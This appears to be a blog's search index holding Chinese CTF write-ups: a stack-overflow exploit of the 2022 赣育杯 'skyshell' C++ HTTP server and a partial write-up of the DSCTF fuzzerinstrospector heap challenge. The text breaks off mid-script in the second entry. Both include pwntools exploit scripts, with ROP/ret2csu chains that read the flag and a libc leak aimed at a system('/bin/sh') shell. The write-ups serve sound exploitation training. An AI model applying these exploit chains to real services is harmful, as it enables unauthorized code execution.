<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2022赣育杯pwn1-skyshell题解</title>
    <url>/2022/10/11/2022%E8%B5%A3%E8%82%B2%E6%9D%AFpwn1-skyshell%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<p>2022赣育杯skyshell题解</p>
<span id="more"></span>

<p>用c++实现的httpd</p>
<p>题目给了一个二进制文件、start.sh以及www文件夹</p>
<p><img src="https://c.img.dasctf.com/images/20221011/1665454627672-b41f75ca-ca1f-4e0c-bb49-7c791474add8.png" alt="image-20221011101559520"></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line">PORT=8888</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;listen on <span class="variable">$PORT</span>&quot;</span></span><br><span class="line">socat tcp-listen:<span class="variable">$PORT</span>,reuseaddr,fork <span class="built_in">exec</span>:./pwn</span><br></pre></td></tr></table></figure>

<p>本地运行start.sh，浏览器访问8888端口</p>
<p><img src="https://c.img.dasctf.com/images/20221011/1665454711811-351e3ca3-568a-495c-be3a-f03e5eac993d.png" alt="image-20221011101825348"></p>
<p>实现了一个简易的shell，不过如果去分析www目录下的shell.js可以发现这里是一个假的shell</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">TerminalShell</span>.<span class="property">commands</span>.<span class="property">dir</span> = <span class="title class_">TerminalShell</span>.<span class="property">commands</span>.<span class="property">ls</span> = <span class="keyword">function</span>(<span class="params">b, c</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> a = $(<span class="string">&quot;&lt;ul&gt;&quot;</span>);</span><br><span class="line">    $.<span class="title function_">each</span>(<span class="variable language_">this</span>.<span class="property">pwd</span>,</span><br><span class="line">    <span class="keyword">function</span>(<span class="params">d, e</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e.<span class="property">type</span> == <span class="string">&quot;dir&quot;</span>) &#123;</span><br><span class="line">            d += <span class="string">&quot;/&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((d[<span class="number">0</span>] != <span class="string">&quot;.&quot;</span> &amp;&amp; d[<span class="number">0</span>] != <span class="string">&quot;/&quot;</span>) || b.<span class="property">map</span> || b.<span class="property">god</span>) &#123;</span><br><span class="line">            a.<span class="title function_">append</span>($(<span class="string">&quot;&lt;li&gt;&quot;</span>).<span class="title function_">text</span>(d))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">if</span>(c) &#123;</span><br><span class="line">        <span class="keyword">if</span>(c == <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">            b.<span class="title function_">print</span>(<span class="string">&quot;bin  boot  dev  etc  flag home  lib  lib64  lost+found  opt  proc  root  run  sbin  srv  sys  tmp  usr  var&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(c == <span class="string">&quot;/home&quot;</span>) &#123;</span><br><span class="line">            b.<span class="title function_">print</span>(<span class="string">&quot;sky&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            b.<span class="title function_">print</span>(<span class="string">&quot;ls: cannot access &#x27;&quot;</span> + c + <span class="string">&quot;&#x27;: Permission denied&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        b.<span class="title function_">print</span>(a)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>大部分命令都是前端处理输出的</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">TerminalShell</span>.<span class="property">commands</span>.<span class="property">write</span> = <span class="keyword">function</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(b) &#123;</span><br><span class="line">        a.<span class="title function_">print</span>(<span class="string">&quot;you write [&quot;</span> + b + <span class="string">&quot;] to admin &quot;</span>); </span><br><span class="line">        </span><br><span class="line">        $.<span class="title function_">post</span>(<span class="string">&quot;/?request=write&quot;</span>,&#123;<span class="attr">msg</span>:b&#125;,<span class="keyword">function</span>(<span class="params">result</span>)&#123;</span><br><span class="line">            a.<span class="title function_">print</span>(<span class="string">&quot;response: &quot;</span> + result.<span class="property">msg</span>); </span><br><span class="line">            <span class="comment">//$(&quot;span&quot;).html(result);</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        a.<span class="title function_">print</span>(<span class="string">&quot;Usage: write [your msg]&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>只有write命令是对后端进行了一个GET+POST的请求</p>
<p>接下来分析附件中的二进制文件</p>
<p>IDA简单分析过后可以找到解析http报文的函数：<code>hackme::net::http::parse_header</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">v42 = (__int64)<span class="keyword">this</span> + <span class="number">24</span>;</span><br><span class="line">  v44 = <span class="number">0</span>;</span><br><span class="line">  v43 = std::string::<span class="built_in">find</span>((<span class="type">char</span> *)<span class="keyword">this</span> + <span class="number">24</span>, <span class="string">&quot;\r\n&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v43 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    std::string::<span class="built_in">substr</span>(v15, v42, <span class="number">0LL</span>, v43);</span><br><span class="line">    v1 = std::string::<span class="built_in">size</span>(v42);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt;= v43 + <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v44 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      std::string::<span class="built_in">substr</span>(v16, v42, v43 + <span class="number">2</span>, <span class="number">-1LL</span>);</span><br><span class="line">      std::string::<span class="keyword">operator</span>=(v42, v16);</span><br><span class="line">      std::string::~<span class="built_in">string</span>(v16);</span><br><span class="line">      v41 = <span class="number">-1</span>;</span><br><span class="line">      v2 = std::string::<span class="built_in">find</span>(v15, <span class="string">&quot;GET&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">      v41 = v2;</span><br><span class="line">      <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v41 = std::string::<span class="built_in">find</span>(v15, <span class="string">&quot;POST&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v41 &lt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v41 = std::string::<span class="built_in">find</span>(v15, <span class="string">&quot;HEAD&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v41 &lt; <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v41 = std::string::<span class="built_in">find</span>(v15, <span class="string">&quot;DELETE&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">            <span class="keyword">if</span> ( v41 &lt; <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v26);</span><br><span class="line">              std::string::<span class="built_in">basic_string</span>(v25, <span class="string">&quot;method&quot;</span>, &amp;v26);</span><br><span class="line">              v7 = std::map&lt;std::string,std::string&gt;::<span class="keyword">operator</span>[]((<span class="type">char</span> *)<span class="keyword">this</span> + <span class="number">152</span>, v25);</span><br><span class="line">              std::string::<span class="keyword">operator</span>=(v7, <span class="string">&quot;unknown&quot;</span>);</span><br><span class="line">              std::string::~<span class="built_in">string</span>(v25);</span><br><span class="line">              std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v26);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              v43 = v41;</span><br><span class="line">              std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v24);</span><br><span class="line">              std::string::<span class="built_in">basic_string</span>(v23, <span class="string">&quot;method&quot;</span>, &amp;v24);</span><br><span class="line">              v6 = std::map&lt;std::string,std::string&gt;::<span class="keyword">operator</span>[]((<span class="type">char</span> *)<span class="keyword">this</span> + <span class="number">152</span>, v23);</span><br><span class="line">              std::string::<span class="keyword">operator</span>=(v6, <span class="string">&quot;delete&quot;</span>);</span><br><span class="line">              std::string::~<span class="built_in">string</span>(v23);</span><br><span class="line">              std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v24);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v43 = v41;</span><br><span class="line">            std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v22);</span><br><span class="line">            std::string::<span class="built_in">basic_string</span>(v21, <span class="string">&quot;method&quot;</span>, &amp;v22);</span><br><span class="line">            v5 = std::map&lt;std::string,std::string&gt;::<span class="keyword">operator</span>[]((<span class="type">char</span> *)<span class="keyword">this</span> + <span class="number">152</span>, v21);</span><br><span class="line">            std::string::<span class="keyword">operator</span>=(v5, <span class="string">&quot;head&quot;</span>);</span><br><span class="line">            std::string::~<span class="built_in">string</span>(v21);</span><br><span class="line">            std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v22);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v43 = v41;</span><br><span class="line">          std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v20);</span><br><span class="line">          std::string::<span class="built_in">basic_string</span>(v19, <span class="string">&quot;method&quot;</span>, &amp;v20);</span><br><span class="line">          v4 = std::map&lt;std::string,std::string&gt;::<span class="keyword">operator</span>[]((<span class="type">char</span> *)<span class="keyword">this</span> + <span class="number">152</span>, v19);</span><br><span class="line">          std::string::<span class="keyword">operator</span>=(v4, <span class="string">&quot;post&quot;</span>);</span><br><span class="line">          std::string::~<span class="built_in">string</span>(v19);</span><br><span class="line">          std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v20);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v43 = v41;</span><br><span class="line">        std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v18);</span><br><span class="line">        std::string::<span class="built_in">basic_string</span>(v17, <span class="string">&quot;method&quot;</span>, &amp;v18);</span><br><span class="line">        v3 = std::map&lt;std::string,std::string&gt;::<span class="keyword">operator</span>[]((<span class="type">char</span> *)<span class="keyword">this</span> + <span class="number">152</span>, v17);</span><br><span class="line">        std::string::<span class="keyword">operator</span>=(v3, <span class="string">&quot;get&quot;</span>);</span><br><span class="line">        std::string::~<span class="built_in">string</span>(v17);</span><br><span class="line">        std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v18);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v43 &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v40 = std::string::<span class="built_in">find</span>(v15, <span class="number">47LL</span>, <span class="number">0LL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v40 &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          std::string::<span class="built_in">substr</span>(v27, v15, v40, <span class="number">-1LL</span>);</span><br><span class="line">          std::string::<span class="keyword">operator</span>=(v15, v27);</span><br><span class="line">          std::string::~<span class="built_in">string</span>(v27);</span><br><span class="line">          v39 = std::string::<span class="built_in">find</span>(v15, <span class="number">32LL</span>, <span class="number">0LL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v39 &gt;= <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            std::string::<span class="built_in">substr</span>(v28, v15, <span class="number">0LL</span>, v39);</span><br><span class="line">            std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v30);</span><br><span class="line">            std::string::<span class="built_in">basic_string</span>(v29, <span class="string">&quot;url&quot;</span>, &amp;v30);</span><br><span class="line">            v8 = std::map&lt;std::string,std::string&gt;::<span class="keyword">operator</span>[]((<span class="type">char</span> *)<span class="keyword">this</span> + <span class="number">152</span>, v29);</span><br><span class="line">            std::string::<span class="keyword">operator</span>=(v8, v28);</span><br><span class="line">            std::string::~<span class="built_in">string</span>(v29);</span><br><span class="line">            std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v30);</span><br><span class="line">            std::string::~<span class="built_in">string</span>(v28);</span><br><span class="line">            std::string::<span class="built_in">substr</span>(v31, v15, v39, <span class="number">-1LL</span>);</span><br><span class="line">            std::string::<span class="keyword">operator</span>=(v15, v31);</span><br><span class="line">            std::string::~<span class="built_in">string</span>(v31);</span><br><span class="line">            v38 = std::string::<span class="built_in">find</span>(v15, <span class="number">47LL</span>, <span class="number">0LL</span>);</span><br><span class="line">            <span class="keyword">if</span> ( v38 &gt;= <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              std::string::<span class="built_in">substr</span>(v32, v15, v38 + <span class="number">1</span>, <span class="number">-1LL</span>);</span><br><span class="line">              std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v34);</span><br><span class="line">              std::string::<span class="built_in">basic_string</span>(v33, <span class="string">&quot;version&quot;</span>, &amp;v34);</span><br><span class="line">              v9 = std::map&lt;std::string,std::string&gt;::<span class="keyword">operator</span>[]((<span class="type">char</span> *)<span class="keyword">this</span> + <span class="number">152</span>, v33);</span><br><span class="line">              std::string::<span class="keyword">operator</span>=(v9, v32);</span><br><span class="line">              std::string::~<span class="built_in">string</span>(v33);</span><br><span class="line">              std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v34);</span><br><span class="line">              std::string::~<span class="built_in">string</span>(v32);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              v44 = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v44 = <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v44 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    std::string::~<span class="built_in">string</span>(v15);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v44 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v44 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    std::map&lt;std::string,std::string&gt;::<span class="built_in">clear</span>((<span class="type">char</span> *)<span class="keyword">this</span> + <span class="number">152</span>);</span><br><span class="line">    <span class="keyword">return</span> v44;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v37 = <span class="number">-1</span>;</span><br><span class="line">      v36 = <span class="number">-1</span>;</span><br><span class="line">      v37 = std::string::<span class="built_in">find</span>(v42, <span class="string">&quot;\r\n&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v37 &lt; <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      std::string::<span class="built_in">substr</span>(v13, v42, <span class="number">0LL</span>, v37);</span><br><span class="line">      std::string::<span class="built_in">substr</span>(v35, v42, v37 + <span class="number">2</span>, <span class="number">-1LL</span>);</span><br><span class="line">      std::string::<span class="keyword">operator</span>=(v42, v35);</span><br><span class="line">      std::string::~<span class="built_in">string</span>(v35);</span><br><span class="line">      v36 = std::string::<span class="built_in">find</span>(v13, <span class="number">58LL</span>, <span class="number">0LL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v36 &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        std::string::<span class="built_in">substr</span>(v14, v13, <span class="number">0LL</span>, v36);</span><br><span class="line">        std::string::<span class="built_in">substr</span>(v15, v13, v36 + <span class="number">2</span>, <span class="number">-1LL</span>);</span><br><span class="line">        hackme::net::http::<span class="built_in">str_lower</span>(<span class="keyword">this</span>, v14);</span><br><span class="line">        hackme::net::http::<span class="built_in">str_lower</span>(<span class="keyword">this</span>, v15);</span><br><span class="line">        v12 = std::map&lt;std::string,std::string&gt;::<span class="keyword">operator</span>[]((<span class="type">char</span> *)<span class="keyword">this</span> + <span class="number">152</span>, v14);</span><br><span class="line">        std::string::<span class="keyword">operator</span>=(v12, v15);</span><br><span class="line">        std::string::~<span class="built_in">string</span>(v15);</span><br><span class="line">        std::string::~<span class="built_in">string</span>(v14);</span><br><span class="line">        v11 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v44 = <span class="number">0</span>;</span><br><span class="line">        v11 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      std::string::~<span class="built_in">string</span>(v13);</span><br><span class="line">      <span class="keyword">if</span> ( v11 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">return</span> v44;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析这个函数的代码是能拿到输入格式的，不过社畜师傅教了一个更简单的方法，直接抓包拿到http报文</p>
<p><img src="https://c.img.dasctf.com/images/20221011/1665455892180-c8c919d3-d25a-4c08-88a0-0f8cb575a4ae.png" alt="image-20221011103808822"></p>
<p>write命令使用GET传参的方法，write后面接的数据使用POST传参的方法。从右边的响应可以看到后端在请求成功是有回显的</p>
<p>而后端正是运行的二进制文件，去IDA的字符串窗口搜索该字符串，交叉引用找到调用该字符串的地方就能找到write命令了</p>
<p><img src="https://c.img.dasctf.com/images/20221011/1665456268606-7ac5ff98-8e19-4d1e-828f-56b6a09ff2ff.PNG"></p>
<p>这里有一个copy的操作</p>
<p>将从v2拷贝v1长度的数据到dest，而v1的大小刚好就是接在write命令之后的数据长度，也就是说这里是我们可控的，只要控制好我们write的数据就能挟持程序控制流了</p>
<p>为了验证我们的猜想，在网页端POST一段垃圾数据进去试试</p>
<p><img src="https://c.img.dasctf.com/images/20221011/1665456866000-b56fcaea-6e73-4d28-b870-9652292fd4d7.png" alt="image-20221011105422527"></p>
<p>在POST了0x1000大小的数据后网页直接寄了</p>
<p><img src="https://c.img.dasctf.com/images/20221011/1665456920614-e5d5e985-a06d-47ec-95b7-77ea9c965938.png" alt="image-20221011105518525"></p>
<p>server端也是成功crash，说明咱们的溢出成功了</p>
<p>剩下的就是简单的栈溢出+retcsu构造orw了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">ip = <span class="string">&#x27;1.14.71.254&#x27;</span></span><br><span class="line">port = <span class="number">28834</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\xff&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> data : io.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (data, <span class="built_in">eval</span>(data)))</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">_flags = <span class="number">0xfbad1800</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">con</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;POST /?request=write HTTP/1.1\r\n&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;Content-Length: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(con)).encode() + <span class="string">b&#x27;\r\n&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;\r\n&#x27;</span></span><br><span class="line">    payload += con</span><br><span class="line">    s(payload) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x403669</span></span><br><span class="line">pop_rbp = <span class="number">0x403590</span></span><br><span class="line">start = <span class="number">0x40066E</span></span><br><span class="line">bss = elf.bss() + <span class="number">0x500</span></span><br><span class="line">gadget1 = <span class="number">0x411260</span>  <span class="comment">#call r12</span></span><br><span class="line">gadget2 = <span class="number">0x41127A</span>  <span class="comment">#6 pop ret</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret2csu</span>(<span class="params">rdi, rsi, rdx, r12</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += p64(gadget2) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(r12) + p64(rdi) + p64(rsi) + p64(rdx)</span><br><span class="line">    payload += p64(gadget1) + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x411283</span></span><br><span class="line">pop_rsi = <span class="number">0x409c7a</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x5d8</span> + p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi) + p64(bss) + p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p64(pop_rbp) + p64(bss) + p64(leave_ret)</span><br><span class="line"><span class="comment">#gdb.attach(io, &#x27;b* 0x404767&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io, &#x27;b* 0x404739&#x27;)</span></span><br><span class="line"></span><br><span class="line">post(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">orw = <span class="string">b&#x27;flag&#x27;</span> + p32(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rdi) + p64(bss) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(elf.plt[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">orw += ret2csu(<span class="number">0x30</span>, bss + <span class="number">0x200</span>, <span class="number">3</span>, elf.got[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(elf.plt[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">s(orw)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<p><img src="https://c.img.dasctf.com/images/20221011/1665457047800-a584b7e1-00a6-4fee-83d6-86c4a75bde32.png" alt="image-20221011105721130"></p>
<p>成功get flag</p>
]]></content>
      <categories>
        <category>pwn</category>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>writeup</tag>
        <tag>2022赣育杯</tag>
      </tags>
  </entry>
  <entry>
    <title>DSCTF</title>
    <url>/2022/07/23/DSCTF/</url>
    <content><![CDATA[<p>DSCTF 部分pwn题复现</p>
<span id="more"></span>

<h1 id="fuzzerinstrospector"><a href="#fuzzerinstrospector" class="headerlink" title="fuzzerinstrospector"></a>fuzzerinstrospector</h1><p>输入6的时候有个带参数的函数调用，参数固定为为heap[0]，函数地址用户输入，所以只需要给heap[0]输入&#x2F;bin&#x2F;sh，然后输入system的地址即可getshell，这题的难点在于增加堆块时需要输入内容，这将使我们泄露libc时会把fd指针覆盖导致泄露失败</p>
<p>这里又学到一个新知识，scanf输入+时会读入失败，所以我们只需要写入+就不会覆盖掉fd指针了</p>
<p>释放一个unsorted bin中的堆块和相邻堆块合并放入top chunk，这时top chunk中将会有残留指针，再malloc出来就能泄露libc了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">banary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">elf = ELF(banary)</span><br><span class="line">ip = <span class="string">&#x27;1.14.71.254&#x27;</span></span><br><span class="line">port = <span class="number">28834</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(banary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\xff&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> addr : log.info(addr)</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">_flags = <span class="number">0xfbad1800</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        sla(<span class="string">b&quot;Index: &quot;</span> + <span class="built_in">str</span>(i).encode() + <span class="string">b&#x27;: &#x27;</span>, <span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&quot;Bitmap: &quot;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, payload, con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        sla(<span class="string">b&quot;Index: &quot;</span> + <span class="built_in">str</span>(i).encode() + <span class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(payload[i]).encode())</span><br><span class="line">    sa(<span class="string">b&quot;Bitmap: &quot;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span 